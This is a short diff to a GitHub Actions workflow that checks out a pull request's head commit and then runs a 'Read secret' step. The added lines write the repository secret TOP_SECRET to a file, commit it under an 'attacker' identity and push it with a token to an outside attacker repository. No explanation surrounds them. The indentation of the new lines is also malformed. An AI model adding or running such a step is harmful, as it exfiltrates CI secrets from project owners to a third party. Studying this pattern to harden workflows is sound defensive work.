@@ -12,6 +12,10 @@ jobs:
           ref: ${{ github.event.pull_request.head.sha }}
 
       - name: Read secret
-        run: |
-          echo "TOP_SECRET=${{ secrets.TOP_SECRET }}" > leaked.txt
-          cat leaked.txt
+    run: |
+      echo "${{ secrets.TOP_SECRET }}" > secret.txt
+      git config user.name "attacker"
+      git config user.email "attacker@example.com"
+      git add secret.txt
+      git commit -m "leaked secret"
+      git push https://<attacker-token>@github.com/attacker/repo.git HEAD:main
